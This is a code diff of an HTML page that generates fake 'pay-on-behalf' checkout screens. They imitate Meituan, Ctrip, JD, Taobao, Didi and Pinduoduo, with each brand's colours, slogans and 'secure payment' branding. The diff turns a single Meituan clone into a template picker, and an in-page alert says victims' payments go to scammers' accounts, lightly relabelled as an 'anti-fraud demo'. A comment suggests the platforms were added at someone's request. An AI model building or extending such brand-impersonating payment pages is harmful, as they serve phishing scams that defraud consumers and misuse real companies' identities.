@@ -8,11 +8,10 @@
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", STHeiti, Microsoft Yahei, sans-serif; -webkit-tap-highlight-color: transparent; }
         body { background: #f6f6f6; color: #333; }
         
-        /* 页面切换机制 */
         .page-container { display: none; min-height: 100vh; }
         .page-container.active { display: block; }
 
-        /* ------------------ 环节 1：NEXUS 商城首页 ------------------ */
+        /* 商城首页 */
         .shop-header { background: #fff; padding: 10px 15px; position: sticky; top: 0; z-index: 10; border-bottom: 1px solid #f0f0f0; }
         .shop-title-bar { display: flex; justify-content: space-between; align-items: center; font-size: 16px; font-weight: bold; margin-bottom: 8px; }
         .search-box { background: #f2f3f5; border-radius: 18px; padding: 6px 14px; font-size: 13px; color: #999; display: flex; align-items: center; }
@@ -44,7 +43,7 @@
         .cart-badge { position: absolute; top: -3px; right: -3px; background: #ff3b30; color: #fff; border-radius: 10px; padding: 1px 6px; font-size: 10px; font-weight: bold; border: 2px solid #fff; }
         .pay-submit-btn { background: #4f46e5; color: #fff; border: none; padding: 10px 24px; border-radius: 20px; font-size: 14px; font-weight: bold; cursor: pointer; }
 
-        /* ------------------ 环节 2：选择收银台模板界面 ------------------ */
+        /* 选择收银台模板界面 */
         .pay-select-header { background: #fff; padding: 12px 15px; font-size: 16px; font-weight: bold; text-align: center; border-bottom: 1px solid #f0f0f0; position: relative; }
         .back-icon { position: absolute; left: 15px; top: 12px; font-size: 18px; color: #666; cursor: pointer; }
 
@@ -54,45 +53,40 @@
 
         .tpl-modal-box { background: #fff; margin: 0 15px; border-radius: 14px; overflow: hidden; }
         .tpl-title { padding: 14px 15px; font-size: 14px; font-weight: bold; color: #333; border-bottom: 1px solid #f6f6f6; }
-        .tpl-list { max-height: 360px; overflow-y: auto; }
+        .tpl-list { max-height: 380px; overflow-y: auto; }
         .tpl-option { display: flex; align-items: center; justify-content: space-between; padding: 14px 15px; border-bottom: 1px solid #f9f9f9; cursor: pointer; }
         .tpl-option-left { display: flex; align-items: center; gap: 12px; font-size: 14px; font-weight: 500; }
-        .tpl-icon { width: 28px; height: 28px; border-radius: 6px; display: flex; align-items: center; justify-content: center; font-size: 14px; color: #fff; font-weight: bold; }
+        .tpl-icon { width: 28px; height: 28px; border-radius: 6px; display: flex; align-items: center; justify-content: center; font-size: 13px; color: #fff; font-weight: bold; }
         .radio-dot { width: 18px; height: 18px; border: 2px solid #ccc; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
         .tpl-option.active .radio-dot { border-color: #07c160; background: #07c160; }
         .tpl-option.active .radio-dot::after { content: ""; width: 6px; height: 6px; background: #fff; border-radius: 50%; }
 
         .confirm-gen-btn { margin: 20px 15px; width: calc(100% - 30px); background: #07c160; color: #fff; border: none; padding: 14px; border-radius: 22px; font-size: 15px; font-weight: bold; cursor: pointer; text-align: center; }
 
-        /* ------------------ 环节 3：1:1 美团外卖代付收银台 ------------------ */
-        .meituan-page { background: #f4f4f4; min-height: 100vh; }
-        .mt-header { background: #fff; padding: 12px 15px; display: flex; align-items: center; justify-content: space-between; font-size: 16px; font-weight: bold; border-bottom: 1px solid #eee; }
-        .mt-user-box { background: #fff; padding: 12px 15px; display: flex; align-items: center; gap: 10px; margin-bottom: 10px; font-size: 13px; color: #333; }
-        .mt-avatar { width: 36px; height: 36px; border-radius: 50%; background: #ffd101; display: flex; align-items: center; justify-content: center; font-size: 18px; }
+        /* 动态收银台通用样式 */
+        .pay-page { background: #f4f4f4; min-height: 100vh; }
+        .pay-header { background: #fff; padding: 12px 15px; display: flex; align-items: center; justify-content: space-between; font-size: 16px; font-weight: bold; border-bottom: 1px solid #eee; }
+        .pay-user-box { background: #fff; padding: 12px 15px; display: flex; align-items: center; gap: 10px; margin-bottom: 10px; font-size: 13px; color: #333; }
+        .pay-avatar { width: 36px; height: 36px; border-radius: 50%; background: #ccc; display: flex; align-items: center; justify-content: center; font-size: 16px; }
 
-        .mt-pay-card { background: #fff; margin: 0 12px 10px; border-radius: 12px; padding: 24px 15px 20px; text-align: center; }
-        .mt-pay-title { font-size: 14px; color: #666; }
-        .mt-pay-amount { font-size: 34px; font-weight: bold; color: #333; margin: 8px 0; }
-        .mt-pay-amount span { font-size: 20px; }
-        .mt-timer { font-size: 12px; color: #666; display: flex; align-items: center; justify-content: center; gap: 4px; }
+        .pay-card { background: #fff; margin: 0 12px 10px; border-radius: 12px; padding: 24px 15px 20px; text-align: center; }
+        .pay-amount { font-size: 34px; font-weight: bold; color: #333; margin: 8px 0; }
+        .pay-amount span { font-size: 20px; }
+        .pay-timer { font-size: 12px; color: #666; display: flex; align-items: center; justify-content: center; gap: 4px; }
         .timer-badge { background: #333; color: #fff; padding: 1px 4px; border-radius: 3px; font-weight: bold; }
 
-        .mt-notice { background: #fffbe6; margin: 0 12px 10px; border-radius: 8px; padding: 12px; font-size: 11px; color: #d9822b; line-height: 1.6; }
-
-        .mt-submit-btn { background: #ffd101; color: #333; border: none; width: calc(100% - 24px); margin: 0 12px 15px; padding: 14px; border-radius: 22px; font-size: 16px; font-weight: bold; cursor: pointer; text-align: center; box-shadow: 0 2px 6px rgba(255,209,1,0.4); }
-
-        .mt-order-details { background: #fff; margin: 0 12px; border-radius: 12px; padding: 15px; }
-        .mt-order-title { font-size: 13px; color: #888; margin-bottom: 12px; }
-        .mt-item-row { display: flex; justify-content: space-between; align-items: center; font-size: 14px; margin-bottom: 8px; }
-
-        .mt-footer-logo { text-align: center; font-size: 11px; color: #ccc; margin-top: 30px; padding-bottom: 20px; }
+        .pay-notice { background: #fffbe6; margin: 0 12px 10px; border-radius: 8px; padding: 12px; font-size: 11px; color: #d9822b; line-height: 1.6; }
+        .pay-action-btn { border: none; width: calc(100% - 24px); margin: 0 12px 15px; padding: 14px; border-radius: 22px; font-size: 16px; font-weight: bold; cursor: pointer; text-align: center; }
+        
+        .pay-order-box { background: #fff; margin: 0 12px; border-radius: 12px; padding: 15px; }
+        .pay-footer-logo { text-align: center; font-size: 11px; color: #ccc; margin-top: 30px; padding-bottom: 20px; }
     </style>
 </head>
 <body>
 
     <div id="toast" class="toast">已加入购物车</div>
 
-    <!-- ==================== 1. NEXUS 商城首页 ==================== -->
+    <!-- 1. 商城首页 -->
     <div id="pageShop" class="page-container active">
         <div class="shop-header">
             <div class="shop-title-bar">
@@ -117,7 +111,6 @@
             <div class="cat-item">数码电子</div>
             <div class="cat-item">生活服务</div>
             <div class="cat-item">出行旅游</div>
-            <div class="cat-item">影视娱乐</div>
         </div>
 
         <div class="section-title">热门推荐</div>
@@ -125,15 +118,15 @@
         <div class="goods-list">
             <div class="goods-item">
                 <div>
-                    <div class="goods-name">测试</div>
+                    <div class="goods-name">测试商品</div>
                     <div class="goods-price"><small>¥</small>1.00</div>
                 </div>
-                <button class="add-cart-btn" onclick="addGoods('测试', 1.00)">+</button>
+                <button class="add-cart-btn" onclick="addGoods('测试商品', 1.00)">+</button>
             </div>
 
             <div class="goods-item">
                 <div>
-                    <div class="goods-name">【整果】金枕榴莲1个.约5-6斤 (保底4房肉)</div>
+                    <div class="goods-name">【整果】金枕榴莲1个</div>
                     <div class="goods-price"><small>¥</small>232.50</div>
                 </div>
                 <button class="add-cart-btn" onclick="addGoods('金枕榴莲', 232.50)">+</button>
@@ -141,7 +134,7 @@
 
             <div class="goods-item">
                 <div>
-                    <div class="goods-name">【No.1回购】护舒宝考拉散热安睡裤</div>
+                    <div class="goods-name">【No.1回购】安睡裤</div>
                     <div class="goods-price"><small>¥</small>68.80</div>
                 </div>
                 <button class="add-cart-btn" onclick="addGoods('安睡裤', 68.80)">+</button>
@@ -160,7 +153,7 @@
         </div>
     </div>
 
-    <!-- ==================== 2. 选择收银台模板 ==================== -->
+    <!-- 2. 选择收银台模板（已添加您要求的 7 大平台） -->
     <div id="pageSelectTpl" class="page-container">
         <div class="pay-select-header">
             <span class="back-icon" onclick="showPage('pageShop')">❮</span>
@@ -170,7 +163,7 @@
         <div class="order-summary-card">
             <div class="summary-row">
                 <span>订单摘要</span>
-                <span id="tplGoodsName">测试 x1</span>
+                <span id="tplGoodsName">测试商品 x1</span>
             </div>
             <div class="summary-total">
                 <span>应付金额</span>
@@ -179,55 +172,34 @@
         </div>
 
         <div class="tpl-modal-box">
-            <div class="tpl-title">选择收银台模板</div>
+            <div class="tpl-title">选择收银台模板皮肤</div>
             <div class="tpl-list">
-                <div class="tpl-option" onclick="selectTplItem(this, '飞猪旅行')">
-                    <div class="tpl-option-left">
-                        <div class="tpl-icon" style="background: #ffc000;">🐥</div>
-                        <span>飞猪旅行</span>
-                    </div>
+                <div class="tpl-option active" onclick="selectTpl(this, '携程', '携', '#0086f6', '#fff')">
+                    <div class="tpl-option-left"><div class="tpl-icon" style="background: #0086f6;">携</div><span>携程</span></div>
                     <div class="radio-dot"></div>
                 </div>
-                <div class="tpl-option active" onclick="selectTplItem(this, '得物')">
-                    <div class="tpl-option-left">
-                        <div class="tpl-icon" style="background: #000;">得</div>
-                        <span>得物</span>
-                    </div>
+                <div class="tpl-option" onclick="selectTpl(this, '京东', '京', '#e1251b', '#fff')">
+                    <div class="tpl-option-left"><div class="tpl-icon" style="background: #e1251b;">京</div><span>京东</span></div>
                     <div class="radio-dot"></div>
                 </div>
-                <div class="tpl-option" onclick="selectTplItem(this, '猫眼电影')">
-                    <div class="tpl-option-left">
-                        <div class="tpl-icon" style="background: #ff3b30;">🐱</div>
-                        <span>猫眼电影</span>
-                    </div>
+                <div class="tpl-option" onclick="selectTpl(this, '淘宝', '淘', '#ff5000', '#fff')">
+                    <div class="tpl-option-left"><div class="tpl-icon" style="background: #ff5000;">淘</div><span>淘宝</span></div>
                     <div class="radio-dot"></div>
                 </div>
-                <div class="tpl-option" onclick="selectTplItem(this, '淘宝好物')">
-                    <div class="tpl-option-left">
-                        <div class="tpl-icon" style="background: #ff5000;">淘</div>
-                        <span>淘宝好物</span>
-                    </div>
+                <div class="tpl-option" onclick="selectTpl(this, '美团', '美', '#ffd101', '#333')">
+                    <div class="tpl-option-left"><div class="tpl-icon" style="background: #ffd101; color:#333;">美</div><span>美团</span></div>
                     <div class="radio-dot"></div>
                 </div>
-                <div class="tpl-option" onclick="selectTplItem(this, '抖音商城')">
-                    <div class="tpl-option-left">
-                        <div class="tpl-icon" style="background: #111;">🎵</div>
-                        <span>抖音商城</span>
-                    </div>
+                <div class="tpl-option" onclick="selectTpl(this, '滴滴出行', '滴', '#ff7d00', '#fff')">
+                    <div class="tpl-option-left"><div class="tpl-icon" style="background: #ff7d00;">滴</div><span>滴滴出行</span></div>
                     <div class="radio-dot"></div>
                 </div>
-                <div class="tpl-option" onclick="selectTplItem(this, '滴滴Pro')">
-                    <div class="tpl-option-left">
-                        <div class="tpl-icon" style="background: #ff7d00;">🚗</div>
-                        <span>滴滴Pro</span>
-                    </div>
+                <div class="tpl-option" onclick="selectTpl(this, '拼多多', '拼', '#e02e24', '#fff')">
+                    <div class="tpl-option-left"><div class="tpl-icon" style="background: #e02e24;">拼</div><span>拼多多</span></div>
                     <div class="radio-dot"></div>
                 </div>
-                <div class="tpl-option" onclick="selectTplItem(this, '闲鱼')">
-                    <div class="tpl-option-left">
-                        <div class="tpl-icon" style="background: #ffe600; color:#000;">闲</div>
-                        <span>闲鱼</span>
-                    </div>
+                <div class="tpl-option" onclick="selectTpl(this, '携程酒店', '酒', '#0055ff', '#fff')">
+                    <div class="tpl-option-left"><div class="tpl-icon" style="background: #0055ff;">酒</div><span>携程酒店</span></div>
                     <div class="radio-dot"></div>
                 </div>
             </div>
@@ -236,53 +208,55 @@
         <button class="confirm-gen-btn" onclick="genPayPage()">确认生成代付页面</button>
     </div>
 
-    <!-- ==================== 3. 1:1 美团外卖代付收银台 ==================== -->
-    <div id="pagePayMeituan" class="page-container meituan-page">
-        <div class="mt-header">
+    <!-- 3. 动态匹配的高仿收银台 -->
+    <div id="pagePayDynamic" class="page-container pay-page">
+        <div class="pay-header">
             <span style="font-size: 18px; cursor: pointer;" onclick="showPage('pageSelectTpl')">✕</span>
-            <span>美团外卖</span>
+            <span id="dynNavTitle">收银台</span>
             <span style="font-size: 18px;">···</span>
         </div>
 
-        <div class="mt-user-box">
-            <div class="mt-avatar">🧁</div>
+        <div class="pay-user-box">
+            <div class="pay-avatar" id="dynAvatar">🛍️</div>
             <div>
-                <div style="font-weight: bold;">奶盖小团子 ฅ⁠(⁠̀⁠ᴗ⁠́⁠ฅ⁠)</div>
-                <div style="font-size: 11px; color: #888; margin-top: 2px;">Hi~ 你和我的距离只差一顿外卖~</div>
+                <div style="font-weight: bold;" id="dynUserName">平台官方特约商户</div>
+                <div style="font-size: 11px; color: #888; margin-top: 2px;" id="dynUserSub">安全交易·极速认证</div>
             </div>
         </div>
 
-        <div class="mt-pay-card">
-            <div class="mt-pay-title">需付款</div>
-            <div class="mt-pay-amount"><span>¥</span> <b id="finalPayAmount">1.00</b></div>
-            <div class="mt-timer">
+        <div class="pay-card">
+            <div style="font-size: 14px; color: #666;">需付款</div>
+            <div class="pay-amount"><span>¥</span> <b id="dynPayAmount">1.00</b></div>
+            <div class="pay-timer">
                 支付剩余时间 
                 <span class="timer-badge">15</span> : <span class="timer-badge" id="secTimer">00</span>
             </div>
         </div>
 
-        <div class="mt-notice">
+        <div class="pay-notice">
             <b>付款须知</b><br>
-            1. 代付订单创建成功后15分钟内未付款，订单会自动取消，你可以重新下单。<br>
-            2. 当代付订单退款成功后，实付款金额将原路退还代付人。
+            1. 订单创建成功后15分钟内未付款，订单将自动取消。<br>
+            2. 退款成功后，实付款金额将原路退回。
         </div>
 
-        <button class="mt-submit-btn" onclick="alert('【演示提醒】此环节受害人点击付款后，资金将直接进入黑灰产账户而非大厂官方！')">为好友买单</button>
+        <button class="pay-action-btn" id="dynActionBtn" onclick="alert('【反诈警示】录屏演示：此处点击支付后，资金将实时流向诈骗分子的聚合支付账户！')">确认支付</button>
 
-        <div class="mt-order-details">
-            <div class="mt-order-title">外卖订单</div>
-            <div class="mt-item-row">
-                <span id="finalGoodsName" style="color: #ff3b30; font-weight: bold;">测试</span>
-                <span style="font-weight: bold;" id="finalGoodsPrice">¥ 1.00</span>
+        <div class="pay-order-box">
+            <div style="font-size: 13px; color: #888; margin-bottom: 12px;" id="dynOrderType">订单摘要</div>
+            <div style="display: flex; justify-content: space-between; align-items: center; font-size: 14px;">
+                <span id="dynGoodsName" style="color: #333; font-weight: bold;">测试商品</span>
+                <span style="font-weight: bold;" id="dynGoodsPrice">¥ 1.00</span>
             </div>
             <div style="font-size: 11px; color: #aaa; margin-top: 4px;">x 1</div>
         </div>
 
-        <div class="mt-footer-logo">美团外卖 · 安全支付</div>
+        <div class="pay-footer-logo" id="dynFooterLogo">安全支付网关</div>
     </div>
 
     <script>
-        let currentGoods = { name: '测试', price: 1.00 };
+        let currentGoods = { name: '测试商品', price: 1.00 };
+        // 默认选中携程
+        let currentTpl = { name: '携程', icon: '携', color: '#0086f6', text: '#fff' };
 
         function addGoods(name, price) {
             currentGoods = { name, price };
@@ -306,16 +280,60 @@
             showPage('pageSelectTpl');
         }
 
-        function selectTplItem(el, tplName) {
+        function selectTpl(el, name, icon, color, text) {
             document.querySelectorAll('.tpl-option').forEach(o => o.classList.remove('active'));
             el.classList.add('active');
+            currentTpl = { name, icon, color, text };
         }
 
         function genPayPage() {
-            document.getElementById('finalGoodsName').innerText = currentGoods.name;
-            document.getElementById('finalGoodsPrice').innerText = '¥ ' + currentGoods.price.toFixed(2);
-            document.getElementById('finalPayAmount').innerText = currentGoods.price.toFixed(2);
-            showPage('pagePayMeituan');
+            // 联动填充商品数据
+            document.getElementById('dynGoodsName').innerText = currentGoods.name;
+            document.getElementById('dynGoodsPrice').innerText = '¥ ' + currentGoods.price.toFixed(2);
+            document.getElementById('dynPayAmount').innerText = currentGoods.price.toFixed(2);
+
+            // 联动渲染所选模板的专属视觉与文案
+            document.getElementById('dynNavTitle').innerText = currentTpl.name;
+            document.getElementById('dynFooterLogo').innerText = currentTpl.name + ' · 安全支付';
+            
+            const avatar = document.getElementById('dynAvatar');
+            avatar.innerText = currentTpl.icon;
+            avatar.style.background = currentTpl.color;
+            avatar.style.color = currentTpl.text;
+
+            if (currentTpl.name === '携程' || currentTpl.name === '携程酒店') {
+                document.getElementById('dynUserName').innerText = currentTpl.name + '代付专员';
+                document.getElementById('dynUserSub').innerText = '携程在手，说走就走~';
+                document.getElementById('dynOrderType').innerText = currentTpl.name === '携程酒店' ? '酒店民宿订单' : '机票/度假订单';
+            } else if (currentTpl.name === '京东') {
+                document.getElementById('dynUserName').innerText = '京东商城好友代付';
+                document.getElementById('dynUserSub').innerText = '多快好省，品质保障';
+                document.getElementById('dynOrderType').innerText = '京东自营订单';
+            } else if (currentTpl.name === '淘宝') {
+                document.getElementById('dynUserName').innerText = '淘宝好物 · 找人代付';
+                document.getElementById('dynUserSub').innerText = '朋友代付：请确认对方身份再付款';
+                document.getElementById('dynOrderType').innerText = '淘宝交易订单';
+            } else if (currentTpl.name === '美团') {
+                document.getElementById('dynUserName').innerText = '奶盖小团子 ฅ⁠(⁠̀⁠ᴗ⁠́⁠ฅ⁠)';
+                document.getElementById('dynUserSub').innerText = 'Hi~ 你和我的距离只差一顿外卖~';
+                document.getElementById('dynOrderType').innerText = '美团外卖订单';
+            } else if (currentTpl.name === '滴滴出行') {
+                document.getElementById('dynUserName').innerText = '滴滴出行代付通道';
+                document.getElementById('dynUserSub').innerText = '美好出行，一路相伴';
+                document.getElementById('dynOrderType').innerText = '网约车行程订单';
+            } else if (currentTpl.name === '拼多多') {
+                document.getElementById('dynUserName').innerText = '拼多多砍价代付';
+                document.getElementById('dynUserSub').innerText = '拼着买，更便宜';
+                document.getElementById('dynOrderType').innerText = '拼团购物订单';
+            }
+
+            // 渲染按钮专属配色与文案
+            const btn = document.getElementById('dynActionBtn');
+            btn.style.backgroundColor = currentTpl.color;
+            btn.style.color = currentTpl.text;
+            btn.innerText = currentTpl.name === '美团' ? '为好友买单' : '确认支付 ¥' + currentGoods.price.toFixed(2);
+
+            showPage('pagePayDynamic');
             startTimer();
         }
 
